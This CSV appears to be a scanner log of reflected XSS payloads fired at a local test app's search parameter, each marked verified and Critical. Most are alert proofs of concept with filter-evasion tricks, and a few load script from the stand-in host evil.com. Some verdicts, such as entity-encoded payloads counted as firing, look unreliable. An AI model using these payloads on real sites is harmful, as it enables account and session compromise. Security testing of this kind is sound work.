Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:26:05.666,2026-01-10 14:26:05.670,0.004,http://localhost:3000/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.670,2026-01-10 14:26:05.673,0.002,http://localhost:3000/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.673,2026-01-10 14:26:05.681,0.008,http://localhost:3000/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.681,2026-01-10 14:26:05.685,0.004,http://localhost:3000/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.685,2026-01-10 14:26:05.689,0.003,http://localhost:3000/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.689,2026-01-10 14:26:05.698,0.009,http://localhost:3000/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.698,2026-01-10 14:26:05.703,0.005,http://localhost:3000/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.703,2026-01-10 14:26:05.706,0.003,http://localhost:3000/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.706,2026-01-10 14:26:05.714,0.008,http://localhost:3000/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.714,2026-01-10 14:26:05.718,0.004,http://localhost:3000/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.718,2026-01-10 14:26:05.721,0.003,http://localhost:3000/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.721,2026-01-10 14:26:05.729,0.008,http://localhost:3000/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.729,2026-01-10 14:26:05.734,0.004,http://localhost:3000/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.734,2026-01-10 14:26:05.737,0.003,http://localhost:3000/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.737,2026-01-10 14:26:05.746,0.009,http://localhost:3000/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.746,2026-01-10 14:26:05.749,0.003,http://localhost:3000/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.749,2026-01-10 14:26:05.753,0.003,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.753,2026-01-10 14:26:05.755,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.755,2026-01-10 14:26:05.763,0.008,http://localhost:3000/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.763,2026-01-10 14:26:05.767,0.004,http://localhost:3000/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.767,2026-01-10 14:26:05.770,0.003,http://localhost:3000/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.770,2026-01-10 14:26:05.773,0.003,http://localhost:3000/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.773,2026-01-10 14:26:05.783,0.010,http://localhost:3000/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.783,2026-01-10 14:26:05.786,0.003,http://localhost:3000/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.786,2026-01-10 14:26:05.789,0.003,http://localhost:3000/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.789,2026-01-10 14:26:05.797,0.008,http://localhost:3000/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.797,2026-01-10 14:26:05.802,0.005,http://localhost:3000/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.802,2026-01-10 14:26:05.805,0.003,http://localhost:3000/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.805,2026-01-10 14:26:05.814,0.009,http://localhost:3000/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.814,2026-01-10 14:26:05.819,0.005,http://localhost:3000/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.819,2026-01-10 14:26:05.822,0.004,http://localhost:3000/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.822,2026-01-10 14:26:05.830,0.008,http://localhost:3000/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.831,2026-01-10 14:26:05.834,0.004,http://localhost:3000/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.834,2026-01-10 14:26:05.837,0.003,http://localhost:3000/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.837,2026-01-10 14:26:05.840,0.003,http://localhost:3000/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.840,2026-01-10 14:26:05.845,0.004,http://localhost:3000/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.845,2026-01-10 14:26:05.848,0.004,http://localhost:3000/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.848,2026-01-10 14:26:05.858,0.010,http://localhost:3000/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.858,2026-01-10 14:26:05.862,0.003,http://localhost:3000/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.862,2026-01-10 14:26:05.870,0.008,http://localhost:3000/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.870,2026-01-10 14:26:05.874,0.005,http://localhost:3000/search,GET,q,<input type=month onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.874,2026-01-10 14:26:05.878,0.004,http://localhost:3000/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.878,2026-01-10 14:26:05.886,0.008,http://localhost:3000/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.886,2026-01-10 14:26:05.889,0.003,http://localhost:3000/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.889,2026-01-10 14:26:05.893,0.004,http://localhost:3000/search,GET,q,<input type=button onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.894,2026-01-10 14:26:05.896,0.003,http://localhost:3000/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.897,2026-01-10 14:26:05.904,0.008,http://localhost:3000/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.904,2026-01-10 14:26:05.908,0.004,http://localhost:3000/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.908,2026-01-10 14:26:05.912,0.004,http://localhost:3000/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.912,2026-01-10 14:26:05.915,0.003,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.915,2026-01-10 14:26:05.924,0.009,http://localhost:3000/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.924,2026-01-10 14:26:05.928,0.004,http://localhost:3000/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.928,2026-01-10 14:26:05.932,0.003,http://localhost:3000/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.932,2026-01-10 14:26:05.941,0.009,http://localhost:3000/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.941,2026-01-10 14:26:05.944,0.004,http://localhost:3000/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.944,2026-01-10 14:26:05.948,0.004,http://localhost:3000/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.948,2026-01-10 14:26:05.955,0.008,http://localhost:3000/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.955,2026-01-10 14:26:05.959,0.003,http://localhost:3000/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.959,2026-01-10 14:26:05.963,0.004,http://localhost:3000/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.963,2026-01-10 14:26:05.970,0.007,http://localhost:3000/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.970,2026-01-10 14:26:05.974,0.005,http://localhost:3000/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.974,2026-01-10 14:26:05.978,0.004,http://localhost:3000/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.978,2026-01-10 14:26:05.986,0.007,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.986,2026-01-10 14:26:05.990,0.004,http://localhost:3000/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.990,2026-01-10 14:26:05.993,0.003,http://localhost:3000/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.993,2026-01-10 14:26:05.997,0.004,http://localhost:3000/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:05.997,2026-01-10 14:26:06.005,0.008,http://localhost:3000/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.005,2026-01-10 14:26:06.009,0.004,http://localhost:3000/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.009,2026-01-10 14:26:06.012,0.003,http://localhost:3000/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.012,2026-01-10 14:26:06.019,0.007,http://localhost:3000/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.019,2026-01-10 14:26:06.023,0.004,http://localhost:3000/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.023,2026-01-10 14:26:06.027,0.004,http://localhost:3000/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.027,2026-01-10 14:26:06.031,0.004,http://localhost:3000/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.031,2026-01-10 14:26:06.038,0.008,http://localhost:3000/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.038,2026-01-10 14:26:06.041,0.003,http://localhost:3000/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.041,2026-01-10 14:26:06.045,0.004,http://localhost:3000/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.046,2026-01-10 14:26:06.049,0.003,http://localhost:3000/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.049,2026-01-10 14:26:06.056,0.007,http://localhost:3000/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.056,2026-01-10 14:26:06.060,0.004,http://localhost:3000/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.060,2026-01-10 14:26:06.064,0.004,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.064,2026-01-10 14:26:06.071,0.008,http://localhost:3000/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.071,2026-01-10 14:26:06.075,0.003,http://localhost:3000/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.075,2026-01-10 14:26:06.079,0.004,http://localhost:3000/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.079,2026-01-10 14:26:06.087,0.008,http://localhost:3000/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.087,2026-01-10 14:26:06.091,0.005,http://localhost:3000/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.091,2026-01-10 14:26:06.095,0.004,http://localhost:3000/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.095,2026-01-10 14:26:06.098,0.003,http://localhost:3000/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.098,2026-01-10 14:26:06.107,0.008,http://localhost:3000/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.107,2026-01-10 14:26:06.110,0.004,http://localhost:3000/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.110,2026-01-10 14:26:06.114,0.004,http://localhost:3000/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.114,2026-01-10 14:26:06.122,0.008,http://localhost:3000/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.122,2026-01-10 14:26:06.125,0.003,http://localhost:3000/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.125,2026-01-10 14:26:06.129,0.004,http://localhost:3000/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.129,2026-01-10 14:26:06.137,0.007,http://localhost:3000/search,GET,q,<font onmouseover=alert(1)>X</font>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.137,2026-01-10 14:26:06.140,0.004,http://localhost:3000/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.140,2026-01-10 14:26:06.144,0.004,http://localhost:3000/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.144,2026-01-10 14:26:06.147,0.003,http://localhost:3000/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.147,2026-01-10 14:26:06.154,0.007,http://localhost:3000/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.154,2026-01-10 14:26:06.158,0.004,http://localhost:3000/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.158,2026-01-10 14:26:06.162,0.004,http://localhost:3000/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.162,2026-01-10 14:26:06.165,0.003,http://localhost:3000/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.166,2026-01-10 14:26:06.175,0.010,http://localhost:3000/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.175,2026-01-10 14:26:06.179,0.004,http://localhost:3000/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.179,2026-01-10 14:26:06.182,0.003,http://localhost:3000/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.182,2026-01-10 14:26:06.191,0.008,http://localhost:3000/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.191,2026-01-10 14:26:06.194,0.003,http://localhost:3000/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.194,2026-01-10 14:26:06.197,0.003,http://localhost:3000/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.197,2026-01-10 14:26:06.205,0.008,http://localhost:3000/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.205,2026-01-10 14:26:06.209,0.004,http://localhost:3000/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.209,2026-01-10 14:26:06.213,0.004,http://localhost:3000/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.213,2026-01-10 14:26:06.222,0.009,http://localhost:3000/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:26:06.222,2026-01-10 14:26:06.226,0.004,http://localhost:3000/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,Yes,alert,Critical
